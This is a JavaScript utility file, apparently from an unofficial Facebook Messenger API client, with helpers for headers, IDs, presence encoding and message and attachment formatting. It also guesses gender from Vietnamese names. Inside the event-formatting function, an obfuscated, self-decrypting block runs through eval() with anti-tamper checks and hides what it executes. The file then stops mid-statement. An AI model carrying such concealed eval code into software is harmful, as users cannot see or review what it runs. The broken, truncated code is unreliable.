// @ts-nocheck
/* eslint-disable no-undef */

/* eslint-disable no-prototype-builtins */

"use strict";
var url = require("url");
var log = require("npmlog");
var stream = require("stream");
var bluebird = require("bluebird");
var querystring = require("querystring");
var request = bluebird.promisify(require("request").defaults({ jar: true }));

/**
 * @param {any} url
 */

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

/**
 * @param {string | URL} url
 * @param {{ userAgent: any; }} options
 * @param {{ region: any; }} [ctx]
 * @param {undefined} [customHeader]
 */

function getHeaders(url, options, ctx, customHeader) {
    var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: "https://www.facebook.com/",
        Host: url.replace("https://", "").split("/")[0],
        Origin: "https://www.facebook.com",
        "user-agent": (options.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"),
        Connection: "keep-alive",
        "sec-fetch-site": 'same-origin',
        "sec-fetch-mode": 'cors'
    };
    if (customHeader) Object.assign(headers, customHeader);
    if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;

    return headers;
}

/**
 * @param {{ _read: any; _readableState: any; }} obj
 */

function isReadableStream(obj) {
    return (
        obj instanceof stream.Stream &&
        (getType(obj._read) === "Function" ||
            getType(obj._read) === "AsyncFunction") &&
        getType(obj._readableState) === "Object"
    );
}

/**
 * @param {any} url
 * @param {any} jar
 * @param {{ [x: string]: any; fb_dtsg?: any; jazoest?: any; hasOwnProperty?: any; }} qs
 * @param {any} options
 * @param {any} ctx
 */

function get(url, jar, qs, options, ctx) {
    // I'm still confused about this
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 60000,
        qs: qs,
        url: url,
        method: "GET",
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res;
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    var op = {
        headers: getHeaders(url, options),
        timeout: 60000,
        url: url,
        method: "POST",
        form: form,
        jar: jar,
        gzip: true
    };
    return request(op).then(function(res) {
        return res;
    });
}

/**
 * @param {any} url
 * @param {any} jar
 * @param {{ __user: any; __req: string; __rev: any; __a: number; 
// __af: siteData.features,
fb_dtsg: any; jazoest: any; }} form
 * @param {{ __user: any; __req: string; __rev: any; __a: number; 
// __af: siteData.features,
fb_dtsg: any; jazoest: any; }} qs
 * @param {any} options
 * @param {any} ctx
 */

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: qs,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res;
    });
}

/**
 * @param {string | number | any[]} val
 * @param {number} [len]
 */

function padZeros(val, len) {
    val = String(val);
    len = len || 2;
    while (val.length < len) val = "0" + val;
    return val;
}

/**
 * @param {any} clientID
 */

function generateThreadingID(clientID) {
    var k = Date.now();
    var l = Math.floor(Math.random() * 4294967295);
    var m = clientID;
    return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
}

/**
 * @param {string | any[]} data
 */

function binaryToDecimal(data) {
    var ret = "";
    while (data !== "0") {
        var end = 0;
        var fullName = "";
        var i = 0;
        for (; i < data.length; i++) {
            end = 2 * end + parseInt(data[i], 10);
            if (end >= 10) {
                fullName += "1";
                end -= 10;
            } else fullName += "0";
        }
        ret = end.toString() + ret;
        data = fullName.slice(fullName.indexOf("1"));
    }
    return ret;
}

function generateOfflineThreadingID() {
    var ret = Date.now();
    var value = Math.floor(Math.random() * 4294967295);
    var str = ("0000000000000000000000" + value.toString(2)).slice(-22);
    var msgs = ret.toString(2) + str;
    return binaryToDecimal(msgs);
}

var h;
var i = {};
var j = {
    _: "%",
    A: "%2",
    B: "000",
    C: "%7d",
    D: "%7b%22",
    E: "%2c%22",
    F: "%22%3a",
    G: "%2c%22ut%22%3a1",
    H: "%2c%22bls%22%3a",
    I: "%2c%22n%22%3a%22%",
    J: "%22%3a%7b%22i%22%3a0%7d",
    K: "%2c%22pt%22%3a0%2c%22vis%22%3a",
    L: "%2c%22ch%22%3a%7b%22h%22%3a%22",
    M: "%7b%22v%22%3a2%2c%22time%22%3a1",
    N: ".channel%22%2c%22sub%22%3a%5b",
    O: "%2c%22sb%22%3a1%2c%22t%22%3a%5b",
    P: "%2c%22ud%22%3a100%2c%22lc%22%3a0",
    Q: "%5d%2c%22f%22%3anull%2c%22uct%22%3a",
    R: ".channel%22%2c%22sub%22%3a%5b1%5d",
    S: "%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a",
    T: "%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a",
    U: "%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    V: "%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a",
    W: "%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a",
    X: "%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1",
    Y: "%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    Z: "%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a"
};
(function() {
    var l = [];
    for (var m in j) {
        i[j[m]] = m;
        l.push(j[m]);
    }
    l.reverse();
    h = new RegExp(l.join("|"), "g");
})();

/**
 * @param {string | number | boolean} str
 */

function presenceEncode(str) {
    return encodeURIComponent(str)
        .replace(/([_A-Z])|%../g, function(m, n) {
            return n ? "%" + n.charCodeAt(0).toString(16) : m;
        })
        .toLowerCase()
        .replace(h, function(m) {
            return i[m];
        });
}

// eslint-disable-next-line no-unused-vars
/**
 * @param {string} str
 */

function presenceDecode(str) {
    return decodeURIComponent(
        str.replace(/[_A-Z]/g, function(/** @type {string | number} */m) {
            return j[m];
        })
    );
}

/**
 * @param {string} userID
 */

function generatePresence(userID) {
    var time = Date.now();
    return (
        "E" +
        presenceEncode(
            JSON.stringify({
                v: 3,
                time: parseInt(time / 1000, 10),
                user: userID,
                state: {
                    ut: 0,
                    t2: [],
                    lm2: null,
                    uct2: time,
                    tr: null,
                    tw: Math.floor(Math.random() * 4294967295) + 1,
                    at: time
                },
                ch: {
                    ["p_" + userID]: 0
                }
            })
        )
    );
}

function generateAccessiblityCookie() {
    var time = Date.now();
    return encodeURIComponent(
        JSON.stringify({
            sr: 0,
            "sr-ts": time,
            jk: 0,
            "jk-ts": time,
            kb: 0,
            "kb-ts": time,
            hcm: 0,
            "hcm-ts": time
        })
    );
}

function getGUID() {
    /** @type {number} */

    var sectionLength = Date.now();
    /** @type {string} */

    var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
        /** @type {number} */

        var r = Math.floor((sectionLength + Math.random() * 16) % 16);
        /** @type {number} */

        sectionLength = Math.floor(sectionLength / 16);
        /** @type {string} */

        var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
        return _guid;
    });
    return id;
}

/**
 * @param {{ mercury: any; blob_attachment: any; attach_type: any; sticker_attachment: any; extensible_attachment: { story_attachment: { target: { __typename: string; }; }; }; metadata: { stickerID: { toString: () => any; }; packID: { toString: () => any; }; spriteURI: any; spriteURI2x: any; width: any; height: any; frameCount: any; frameRate: any; framesPerRow: any; framesPerCol: any; fbid: { toString: () => any; }; url: any; dimensions: { split: (arg0: string) => any[]; width: any; height: any; }; duration: any; }; url: any; name: any; fileName: any; thumbnail_url: any; preview_url: any; preview_width: any; preview_height: any; large_preview_url: any; large_preview_width: any; large_preview_height: any; share: { share_id: { toString: () => any; }; title: any; description: any; source: any; media: { image: any; image_size: { width: any; height: any; }; playable: any; duration: any; animated_image_size: any; }; subattachments: any; uri: any; target: any; style_list: any; }; }} attachment1
 * @param {{ caption?: any; description?: any; id: any; is_malicious?: any; mime_type?: any; file_size?: any; filename?: any; image_data: any; href?: any; }} [attachment2]
 */

function _formatAttachment(attachment1, attachment2) {
    // TODO: THIS IS REALLY BAD
    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
    // two attachment objects, but sometimes only one. They each contain part of the
    // data that you'd want so we merge them for convenience.
    // Instead of having a bunch of if statements guarding every access to image_data,
    // we set it to empty object and use the fact that it'll return undefined.

    attachment2 = attachment2 || { id: "", image_data: {} };
    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;
    var blob = attachment1.blob_attachment;
    var type =
        blob && blob.__typename ? blob.__typename : attachment1.attach_type;
    if (!type && attachment1.sticker_attachment) {
        type = "StickerAttachment";
        blob = attachment1.sticker_attachment;
    } else if (!type && attachment1.extensible_attachment) {
        if (
            attachment1.extensible_attachment.story_attachment &&
            attachment1.extensible_attachment.story_attachment.target &&
            attachment1.extensible_attachment.story_attachment.target.__typename &&
            attachment1.extensible_attachment.story_attachment.target.__typename === "MessageLocation"
        ) type = "MessageLocation";
        else type = "ExtensibleAttachment";

        blob = attachment1.extensible_attachment;
    }
    // TODO: Determine whether "sticker", "photo", "file" etc are still used
    // KEEP IN SYNC WITH getThreadHistory
    switch (type) {
        case "sticker":
            return {
                type: "sticker",
                ID: attachment1.metadata.stickerID.toString(),
                url: attachment1.url,

                packID: attachment1.metadata.packID.toString(),
                spriteUrl: attachment1.metadata.spriteURI,
                spriteUrl2x: attachment1.metadata.spriteURI2x,
                width: attachment1.metadata.width,
                height: attachment1.metadata.height,

                caption: attachment2.caption,
                description: attachment2.description,

                frameCount: attachment1.metadata.frameCount,
                frameRate: attachment1.metadata.frameRate,
                framesPerRow: attachment1.metadata.framesPerRow,
                framesPerCol: attachment1.metadata.framesPerCol,

                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy
                spriteURI: attachment1.metadata.spriteURI, // @Legacy
                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy
            };
        case "file":
            return {
                type: "file",
                filename: attachment1.name,
                ID: attachment2.id.toString(),
                url: attachment1.url,

                isMalicious: attachment2.is_malicious,
                contentType: attachment2.mime_type,

                name: attachment1.name, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                fileSize: attachment2.file_size // @Legacy
            };
        case "photo":
            return {
                type: "photo",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.fileName,
                thumbnailUrl: attachment1.thumbnail_url,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                largePreviewUrl: attachment1.large_preview_url,
                largePreviewWidth: attachment1.large_preview_width,
                largePreviewHeight: attachment1.large_preview_height,

                url: attachment1.metadata.url, // @Legacy
                width: attachment1.metadata.dimensions.split(",")[0], // @Legacy
                height: attachment1.metadata.dimensions.split(",")[1], // @Legacy
                name: attachment1.fileName // @Legacy
            };
        case "animated_image":
            return {
                type: "animated_image",
                ID: attachment2.id.toString(),
                filename: attachment2.filename,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment2.image_data.url,
                width: attachment2.image_data.width,
                height: attachment2.image_data.height,

                name: attachment1.name, // @Legacy
                facebookUrl: attachment1.url, // @Legacy
                thumbnailUrl: attachment1.thumbnail_url, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy
                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy
                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy
                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy
                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy
                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy
            };
        case "share":
            return {
                type: "share",
                ID: attachment1.share.share_id.toString(),
                url: attachment2.href,

                title: attachment1.share.title,
                description: attachment1.share.description,
                source: attachment1.share.source,

                image: attachment1.share.media.image,
                width: attachment1.share.media.image_size.width,
                height: attachment1.share.media.image_size.height,
                playable: attachment1.share.media.playable,
                duration: attachment1.share.media.duration,

                subattachments: attachment1.share.subattachments,
                properties: {},

                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy
                facebookUrl: attachment1.share.uri, // @Legacy
                target: attachment1.share.target, // @Legacy
                styleList: attachment1.share.style_list // @Legacy
            };
        case "video":
            return {
                type: "video",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.name,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment1.url,
                width: attachment1.metadata.dimensions.width,
                height: attachment1.metadata.dimensions.height,

                duration: attachment1.metadata.duration,
                videoType: "unknown",

                thumbnailUrl: attachment1.thumbnail_url // @Legacy
            };
        case "error":
            return {
                type: "error",

                // Save error attachments because we're unsure of their format,
                // and whether there are cases they contain something useful for debugging.
                attachment1: attachment1,
                attachment2: attachment2
            };
        case "MessageImage":
            return {
                type: "photo",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,
                thumbnailUrl: blob.thumbnail.uri,

                previewUrl: blob.preview.uri,
                previewWidth: blob.preview.width,
                previewHeight: blob.preview.height,

                largePreviewUrl: blob.large_preview.uri,
                largePreviewWidth: blob.large_preview.width,
                largePreviewHeight: blob.large_preview.height,

                url: blob.large_preview.uri, // @Legacy
                width: blob.original_dimensions.x, // @Legacy
                height: blob.original_dimensions.y, // @Legacy
                name: blob.filename // @Legacy
            };
        case "MessageAnimatedImage":
            return {
                type: "animated_image",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,

                previewUrl: blob.preview_image.uri,
                previewWidth: blob.preview_image.width,
                previewHeight: blob.preview_image.height,

                url: blob.animated_image.uri,
                width: blob.animated_image.width,
                height: blob.animated_image.height,

                thumbnailUrl: blob.preview_image.uri, // @Legacy
                name: blob.filename, // @Legacy
                facebookUrl: blob.animated_image.uri, // @Legacy
                rawGifImage: blob.animated_image.uri, // @Legacy
                animatedGifUrl: blob.animated_image.uri, // @Legacy
                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy
                animatedWebpUrl: blob.animated_image.uri, // @Legacy
                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy
            };
        case "MessageVideo":
            return {
                type: "video",
                filename: blob.filename,
                ID: blob.legacy_attachment_id,

                previewUrl: blob.large_image.uri,
                previewWidth: blob.large_image.width,
                previewHeight: blob.large_image.height,

                url: blob.playable_url,
                width: blob.original_dimensions.x,
                height: blob.original_dimensions.y,

                duration: blob.playable_duration_in_ms,
                videoType: blob.video_type.toLowerCase(),

                thumbnailUrl: blob.large_image.uri // @Legacy
            };
        case "MessageAudio":
            return {
                type: "audio",
                filename: blob.filename,
                ID: blob.url_shimhash,

                audioType: blob.audio_type,
                duration: blob.playable_duration_in_ms,
                url: blob.playable_url,

                isVoiceMail: blob.is_voicemail
            };
        case "StickerAttachment":
            return {
                type: "sticker",
                ID: blob.id,
                url: blob.url,

                packID: blob.pack ? blob.pack.id : null,
                spriteUrl: blob.sprite_image,
                spriteUrl2x: blob.sprite_image_2x,
                width: blob.width,
                height: blob.height,

                caption: blob.label,
                description: blob.label,

                frameCount: blob.frame_count,
                frameRate: blob.frame_rate,
                framesPerRow: blob.frames_per_row,
                framesPerCol: blob.frames_per_column,

                stickerID: blob.id, // @Legacy
                spriteURI: blob.sprite_image, // @Legacy
                spriteURI2x: blob.sprite_image_2x // @Legacy
            };
        case "MessageLocation":
            var urlAttach = blob.story_attachment.url;
            var mediaAttach = blob.story_attachment.media;

            var u = querystring.parse(url.parse(urlAttach).query).u;
            var where1 = querystring.parse(url.parse(u).query).where1;
            var address = where1.split(", ");

            var latitude;
            var longitude;

            try {
                latitude = Number.parseFloat(address[0]);
                longitude = Number.parseFloat(address[1]);
            } catch (err) {
                /* empty */

            }

            var imageUrl;
            var width;
            var height;

            if (mediaAttach && mediaAttach.image) {
                imageUrl = mediaAttach.image.uri;
                width = mediaAttach.image.width;
                height = mediaAttach.image.height;
            }

            return {
                type: "location",
                ID: blob.legacy_attachment_id,
                latitude: latitude,
                longitude: longitude,
                image: imageUrl,
                width: width,
                height: height,
                url: u || urlAttach,
                address: where1,

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "ExtensibleAttachment":
            return {
                type: "share",
                ID: blob.legacy_attachment_id,
                url: blob.story_attachment.url,

                title: blob.story_attachment.title_with_entities.text,
                description: blob.story_attachment.description &&
                    blob.story_attachment.description.text,
                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,

                image: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.uri,
                width: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.width,
                height: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.height,
                playable: blob.story_attachment.media &&
                    blob.story_attachment.media.is_playable,
                duration: blob.story_attachment.media &&
                    blob.story_attachment.media.playable_duration_in_ms,
                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,

                subattachments: blob.story_attachment.subattachments,
                properties: blob.story_attachment.properties.reduce(function(/** @type {{ [x: string]: any; }} */obj, /** @type {{ key: string | number; value: { text: any; }; }} */cur) {
                    obj[cur.key] = cur.value.text;
                    return obj;
                }, {}),

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "MessageFile":
            return {
                type: "file",
                filename: blob.filename,
                ID: blob.message_file_fbid,

                url: blob.url,
                isMalicious: blob.is_malicious,
                contentType: blob.content_type,

                name: blob.filename,
                mimeType: "",
                fileSize: -1
            };
        default:
            throw new Error(
                "unrecognized attach_file of type " +
                type +
                "`" +
                JSON.stringify(attachment1, null, 4) +
                " attachment2: " +
                JSON.stringify(attachment2, null, 4) +
                "`"
            );
    }
}

/**
 * @param {any[]} attachments
 * @param {{ [x: string]: string | number; }} attachmentIds
 * @param {{ [x: string]: any; }} attachmentMap
 * @param {any} shareMap
 */

function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
    attachmentMap = shareMap || attachmentMap;
    return attachments ?
        attachments.map(function(/** @type {any} */val, /** @type {string | number} */i) {
            if (!attachmentMap ||
                !attachmentIds ||
                !attachmentMap[attachmentIds[i]]
            ) {
                return _formatAttachment(val);
            }
            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);
        }) : [];
}

/**
 * @param {{ delta: { messageMetadata: any; data: { prng: string; }; body: string; attachments: any; participants: any; }; }} m
 */

function formatDeltaMessage(m) {
    var md = m.delta.messageMetadata;
    var mdata =
        m.delta.data === undefined ? [] :
        m.delta.data.prng === undefined ? [] :
        JSON.parse(m.delta.data.prng);
    var m_id = mdata.map((/** @type {{ i: any; }} */u) => u.i);
    var m_offset = mdata.map((/** @type {{ o: any; }} */u) => u.o);
    var m_length = mdata.map((/** @type {{ l: any; }} */u) => u.l);
    var mentions = {};
    var body = m.delta.body || "";
    var args = body == "" ? [] : body.trim().split(/\s+/);
    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.delta.body.substring(m_offset[i], m_offset[i] + m_length[i]);

    return {
        type: "message",
        senderID: formatID(md.actorFbId.toString()),
        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),
        messageID: md.messageId,
        args: args,
        body: body,
        attachments: (m.delta.attachments || []).map((/** @type {any} */v) => _formatAttachment(v)),
        mentions: mentions,
        timestamp: md.timestamp,
        isGroup: !!md.threadKey.threadFbId,
        participantIDs: m.delta.participants || []
    };
}

/**
 * @param {string} id
 */

function formatID(id) {
    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, "");
    else return id;
}

/**
 * @param {{ message: any; type: string; realtime_viewer_fbid: { toString: () => any; }; }} m
 */

function formatMessage(m) {
    var originalMessage = m.message ? m.message : m;
    var obj = {
        type: "message",
        senderName: originalMessage.sender_name,
        senderID: formatID(originalMessage.sender_fbid.toString()),
        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
        participantIDs: originalMessage.group_thread_info ?
            originalMessage.group_thread_info.participant_ids.map(function(/** @type {{ toString: () => any; }} */v) {
                return formatID(v.toString());
            }) : [formatID(originalMessage.sender_fbid)],
        body: originalMessage.body || "",
        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),
        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,
        location: originalMessage.coordinates ? originalMessage.coordinates : null,
        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,
        attachments: formatAttachment(
            originalMessage.attachments,
            originalMessage.attachmentIds,
            originalMessage.attachment_map,
            originalMessage.share_map
        ),
        timestamp: originalMessage.timestamp,
        timestampAbsolute: originalMessage.timestamp_absolute,
        timestampRelative: originalMessage.timestamp_relative,
        timestampDatetime: originalMessage.timestamp_datetime,
        tags: originalMessage.tags,
        reactions: originalMessage.reactions ? originalMessage.reactions : [],
        isUnread: originalMessage.is_unread 
    };

    if (m.type === "pages_messaging") obj.pageID = m.realtime_viewer_fbid.toString();
    obj.isGroup = obj.participantIDs.length > 2;

    return obj;
}

/**
 * @param {{ message: any; }} m
 */

function formatEvent(m) {
    var originalMessage = m.message ? m.message : m;
    var logMessageType = originalMessage.log_message_type;
    var logMessageData;
    if (logMessageType === "log:generic-admin-text") {
        logMessageData = originalMessage.log_message_data.untypedData;
        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);
    } else logMessageData = originalMessage.log_message_data;

    return Object.assign(formatMessage(originalMessage), {
        type: "event",
        logMessageType: logMessageType,
        logMessageData: logMessageData,
        logMessageBody: originalMessage.log_message_body
    });
}

/**
 * @param {{ action_type: any; }} m
 */

function formatHistoryMessage(m) {
    switch (m.action_type) {
        case "ma-type:log-message":
            return formatEvent(m);
        default:
            return formatMessage(m);
    }
}

// Get a more readable message type for AdminTextMessages
/**
 * @param {{ type: any; }} m
 */

function getAdminTextMessageType(m) {
    switch (m.type) {
        case "joinable_group_link_mode_change":
            return "log:link-status"
        case "magic_words":
            return "log:magic-words";
        case "change_thread_theme":
            return "log:thread-color";
        case "change_thread_icon":
            return "log:thread-icon";
        case "change_thread_nickname":
            return "log:user-nickname";
        case "change_thread_admins":
            return "log:thread-admins";
        case "group_poll":
            return "log:thread-poll";
        case "change_thread_approval_mode":
            return "log:thread-approval-mode";
        case "messenger_call_log":
        case "participant_joined_group_call":
            return "log:thread-call";
    }
}

/**
 * @param {string} name
 */

function getGenderByPhysicalMethod(name) {
    var GirlName = ["LAN", "HÂN", "LINH", "MAI", "HOA", "THU", "BĂNG", "MỸ", "CHÂU", "THẢO", "THOA", "MẪN", "THÙY", "THỦY", "NGA", "NGÂN", "NGHI", "THƯ", "NGỌC", "BÍCH", "VÂN", "DIỆP", "CHI", "TIÊN", "XUÂN", "GIANG", "NHUNG", "DUNG", "NHƯ", "YẾN", "QUYÊN", "YẾN", "TƯỜNG", "VY", "PHƯƠNG", "LIÊN", "LAN", "HÀ", "MAI", "ĐAN", "HẠ", "QUYÊN", "LY", "HÒA", "OANH", "HƯƠNG", "HẰNG", "QUỲNH", "HẠNH", "NHIÊN", "NHẠN"];

    var BoyName = ["HƯNG", "HUY", "KHẢI", "KHANG", "KHOA", "KHÔI", "KIÊN", "KIỆT", "LONG", "MINH", "ÂN", "BẢO", "BÌNH", "CƯỜNG", "ĐẠT", "ĐỨC", "DŨNG", "DUY", "HOÀNG", "HÙNG", "HƯNG", "NGHĨA", "NGUYÊN", "THẮNG", "THIỆN", "THỊNH", "TÒA", "TRIẾT", "TRUNG", "TRƯỜNG", "TUẤN", "NHÂN", "VŨ", "VINH", "PHONG", "PHÚC", "QUÂN", "QUANG", "SƠN", "TÀI", "THẮNG", "ĐĂNG", "VĂN", "VĨ", "QUANG", "MẠNH"];

    var OtherName = ["ANH", "THANH", "TÂM", "DƯƠNG", "AN", "LÂM", "MIÊN", "TÚ", "LÂM", "BẰNG", "KHÁNH", "NHẬT", "VỸ", ".",",","/","%", "&","*","-","+"];

    try {
        var NameArray = name.split(" ");
            name = NameArray[NameArray.length - 1];
        var Name;
            if (name == " " || name == null) return "UNKNOWN";
            switch (GirlName.includes(name.toUpperCase())) {
                case true: {
                    if (!OtherName.includes(name.toUpperCase()) && !BoyName.includes(name.toUpperCase())) Name = "FEMALE";
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
                case false: {
                    if (!OtherName.includes(name.toUpperCase()) && !GirlName.includes(name.toUpperCase())) Name = "MALE"
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
        } 
    }
    catch (e) {
        return "UNKNOWN"
    }
    return Name || "UNKNOWN";
}

/**
 * @param {{ [x: string]: { [x: string]: { [x: string]: any; }; }; class: any; untypedData: any; name: any; addedParticipants: any; leftParticipantFbId: any; messageMetadata: { threadKey: { threadFbId: any; otherUserFbId: any; }; adminText: any; actorFbId: any; }; participants: any; }} m
 */

function formatDeltaEvent(m) {
    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');
    var logMessageType;
    var logMessageData;

switch (m.class) {
    case "AdminTextMessage":
        logMessageType = getAdminTextMessageType(m);
            logMessageData = m.untypedData;
        break;
    case "ThreadName":
        logMessageType = "log:thread-name";
            logMessageData = { name: m.name };
        break;
    case "ParticipantsAddedToGroupThread":
        logMessageType = "log:subscribe";
            logMessageData = { addedParticipants: m.addedParticipants };
        break;
    case "ParticipantLeftGroupThread":
        logMessageType = "log:unsubscribe";
        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
    break;
}

let beeS;
! function() {
    const AK1F = Array.prototype.slice.call(arguments);
    return eval("(function EnaP(nDhH){const PakH=Xm1H(nDhH,nFOH(EnaP.toString()));try{let PcRH=eval(PakH);return PcRH.apply(null,AK1F);}catch(rKTH){var L7LH=(0o204026-67583);while(L7LH<(0o400111%65560))switch(L7LH){case (0x3006E%0o200035):L7LH=rKTH instanceof SyntaxError?(0o400110%0x1001D):(0o400113%0x10019);break;case (0o200644-0x10196):L7LH=(0o400127%65567);{console.log(\'Error: the code has been tampered!\');return}break;}throw rKTH;}function nFOH(H2GH){let jAJH=720003784;var DXBH=(0o400064%65556);{let fvEH;while(DXBH<(0x105A0-0o202574)){switch(DXBH){case (0o600156%0x10019):DXBH=(68536-0o205637);{jAJH^=(H2GH.charCodeAt(fvEH)*(15658734^0O73567354)+H2GH.charCodeAt(fvEH>>>(0x4A5D0CE&0O320423424)))^33263649;}break;case (0o204704-68011):DXBH=(131133%0o200026);fvEH++;break;case (262277%0o200035):DXBH=fvEH<H2GH.length?(0o400153%0x10024):(68056-0o204664);break;case (0o1000124%0x10012):DXBH=(0o202246-0x10495);fvEH=(0x75bcd15-0O726746425);break;}}}let fxbI=\"\";var H4dI=(65816-0o200412);{let bs6H;while(H4dI<(0o600205%0x10022)){switch(H4dI){case (0o600137%65563):H4dI=(0x20048%0o200030);bs6H=(0x21786%3);break;case (0o200740-0x101C8):H4dI=bs6H<(0O347010110&0x463A71D)?(65726-0o200253):(0o400151%0x10025);break;case (131147%0o200034):H4dI=(0o203410-0x106EA);{const DZ8H=jAJH%(0o202760-67037);jAJH=Math.floor(jAJH/(0x30073%0o200040));fxbI+=DZ8H>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(DZ8H-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+DZ8H);}break;case (0o600140%0x10016):H4dI=(0o200360-65752);bs6H++;break;}}}return fxbI;}function Xm1H(zU3H,ThWH){zU3H=decodeURI(zU3H);let vPYH=(0x75bcd15-0O726746425);let XeTF=\"\";var zMVF=(0o203030-0x1060C);{let T9NF;while(zMVF<(0x110E0-0o210274)){switch(zMVF){case (0o200536-0x1013B):zMVF=(0o200764-66011);{XeTF+=String.fromCharCode(zU3H.charCodeAt(T9NF)^ThWH.charCodeAt(vPYH));vPYH++;var vHQF=(0o203554-0x10746);while(vHQF<(0x300A2%0o200051))switch(vHQF){case (0o400144%65567):vHQF=vPYH>=ThWH.length?(66796-0o202332):(0o600231%65574);break;case (262214%0o200015):vHQF=(0o1000313%65577);{vPYH=(0x75bcd15-0O726746425);}break;}}break;case (0o400111%0x1001C):zMVF=T9NF<zU3H.length?(196751%0o200044):(262320%0o200043);break;case (262208%0o200015):zMVF=(65706-0o200231);T9NF=(0x75bcd15-0O726746425);break;case (0o400121%65564):zMVF=(0x30074%0o200041);T9NF++;break;}}}return 